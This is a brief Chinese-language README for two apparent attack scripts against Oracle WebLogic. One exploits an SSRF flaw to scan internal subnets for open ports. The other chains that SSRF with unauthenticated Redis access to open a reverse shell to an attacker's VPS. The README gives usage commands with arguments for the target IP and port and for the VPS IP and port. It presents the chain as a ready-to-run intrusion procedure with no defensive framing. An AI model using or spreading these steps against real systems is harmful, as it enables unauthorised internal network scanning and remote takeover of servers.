
weblogic_ssrf.py扫描内网段ip脚本
weblogic_get_redis_shell.py 利用weblogic_ssrf漏洞，redis反弹shell脚本

使用方法：
python weblogic_ssrf.py  192.168.1.0  20
参数表示：内网网段  线程数
weblogic_ssrf.py扫描内网段ip 端口
脚本里面扫描的端口可以添加其他常用端口，如果可以扫描到redis端口开放，即可尝试反弹shell


扫描出来6379端口，如果存在未授权访问漏洞-------------->通过vps反弹shell
python weblogic_get_redis_shell.py [rip] [rport(6379)] [vpsip] [vpsport]
  


